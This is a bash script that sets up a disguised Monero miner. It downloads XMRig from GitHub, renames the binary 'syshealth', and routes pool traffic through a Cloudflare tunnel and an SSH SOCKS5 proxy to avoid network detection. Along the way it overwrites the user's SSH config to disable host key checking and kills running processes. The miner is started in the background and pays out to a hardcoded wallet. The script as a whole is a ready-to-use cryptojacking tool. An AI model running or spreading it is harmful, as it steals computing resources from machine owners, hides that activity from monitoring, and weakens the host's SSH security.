#!/bin/bash
# cloudflared-mine.sh - Mine using Cloudflare Tunnel + SSH SOCKS5
# Usage: bash cloudflared-mine.sh <CLOUDFLARE_TUNNEL_URL>
# Example: bash cloudflared-mine.sh https://abc123.trycloudflare.com

WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Check if tunnel URL provided
if [ -z "$1" ]; then
  echo "ERROR: Please provide Cloudflare Tunnel URL"
  echo "Usage: bash cloudflared-mine.sh <TUNNEL_URL>"
  echo ""
  echo "First, on your VPS run:"
  echo "  cloudflared tunnel --url ssh://localhost:22"
  echo ""
  echo "It will output a URL like: https://abc123.trycloudflare.com"
  echo "Then run this script with that URL"
  exit 1
fi

TUNNEL_URL="$1"

# Install cloudflared
echo "Installing cloudflared..."
if ! command -v cloudflared &> /dev/null; then
  wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
  chmod +x /tmp/cloudflared
  sudo mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null || mv /tmp/cloudflared "$SCRIPT_DIR/cloudflared"
  export PATH="$SCRIPT_DIR:$PATH"
fi

# Download miner if needed
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  echo "Downloading XMRig..."
  curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz -C /tmp
  mv /tmp/xmrig-6.21.0/xmrig "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig-*
fi

# Kill any existing processes
pkill -9 cloudflared syshealth ssh || true
sleep 2

# Create SSH config to accept any host key
mkdir -p ~/.ssh
cat > ~/.ssh/config <<EOF
Host *
    StrictHostKeyChecking no
    UserKnownHostsFile=/dev/null
    LogLevel ERROR
EOF
chmod 600 ~/.ssh/config

# Get the SSH command from cloudflared
echo "Connecting to Cloudflare Tunnel: $TUNNEL_URL"
# Extract hostname from URL
TUNNEL_HOST=$(echo "$TUNNEL_URL" | sed -e 's|^https://||' -e 's|/.*||')

# Start SSH SOCKS5 proxy through cloudflared
echo "Starting SSH SOCKS5 proxy..."
cloudflared access ssh --hostname "$TUNNEL_HOST" --destination localhost:22 &
CLOUDFLARED_PID=$!
sleep 5

# Start SSH with dynamic port forwarding (SOCKS5)
echo "Creating SOCKS5 proxy on localhost:1080..."
ssh -o ProxyCommand="cloudflared access ssh-config --hostname $TUNNEL_HOST" \
    -D 1080 -N -f root@$TUNNEL_HOST

sleep 3

# Check if SOCKS5 is working
if ! netstat -tuln | grep -q ":1080"; then
  echo "ERROR: SOCKS5 proxy not running on port 1080"
  exit 1
fi

echo "SOCKS5 proxy ready on localhost:1080"

# Start mining with SOCKS5 proxy
echo "Starting miner..."
cd "$SCRIPT_DIR"

nohup ./syshealth \
  --donate-level 1 \
  -o "$POOL_URL" \
  -u "$WALLET" \
  -p "$WORKER_NAME" \
  --socks5 127.0.0.1:1080 \
  --tls \
  --keepalive \
  -l xmrig.log \
  > /dev/null 2>&1 &

MINER_PID=$!
echo "Miner started with PID: $MINER_PID"

# Monitor miner
sleep 10
if ps -p $MINER_PID > /dev/null; then
  echo "✓ Mining successfully!"
  echo "Check log: tail -f $SCRIPT_DIR/xmrig.log"
  tail -20 "$SCRIPT_DIR/xmrig.log"
else
  echo "✗ Miner failed to start. Check log:"
  tail -50 "$SCRIPT_DIR/xmrig.log"
  exit 1
fi
